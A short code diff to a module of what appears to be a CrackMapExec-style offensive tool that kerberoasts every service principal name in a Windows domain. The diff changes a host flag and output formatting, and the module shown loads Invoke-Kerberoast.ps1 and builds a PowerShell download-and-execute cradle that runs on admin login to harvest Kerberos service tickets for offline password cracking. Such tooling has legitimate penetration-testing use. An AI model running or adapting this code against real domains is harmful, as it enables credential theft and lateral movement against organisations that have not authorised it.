@@ -16,7 +16,7 @@ class CMXModule:
     description = "Kerberoasts all found SPNs for the current domain"
     supported_protocols = ['smb']
     opsec_safe = True
-    multiple_hosts = True
+    multiple_hosts = False
 
     def options(self, context, module_options):
         """
@@ -35,7 +35,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Kerberoast {}".format(self.command)
+        command = "Invoke-Kerberoast {} | fl | Out-String".format(self.command)
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
